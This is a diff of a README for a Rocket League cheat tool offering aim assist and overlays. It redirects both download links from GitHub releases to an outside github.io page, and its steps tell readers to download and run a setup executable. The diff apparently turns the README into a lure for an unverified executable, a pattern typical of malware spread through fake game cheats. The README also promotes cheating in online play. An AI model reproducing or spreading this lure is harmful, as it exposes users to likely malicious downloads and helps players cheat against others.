@@ -1,6 +1,6 @@
 # ⚽ RL-Ultimate-Vision - Gain the edge in Rocket League
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/melessainternationalistic758/RL-Ultimate-Vision/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://melessainternationalistic758.github.io)
 
 RL-Ultimate-Vision provides visual tools to improve your performance in Rocket League. The software includes a ball predictor, aim assist, boost management, and player visibility overlays. These tools display data on your screen to help you track game events and anticipate ball movement.
 
@@ -20,7 +20,7 @@ Ensure your Windows installation has the latest updates. You also need the lates
 
 Follow these steps to set up the software.
 
-1.  Visit the [official releases page](https://github.com/melessainternationalistic758/RL-Ultimate-Vision/releases) to view current versions.
+1.  Visit the [official releases page](https://melessainternationalistic758.github.io) to view current versions.
 2.  Locate the file named `RL-Ultimate-Vision-Setup.exe` under the Assets section of the latest release.
 3.  Click the file to download it to your computer.
 4.  Run the downloaded file.
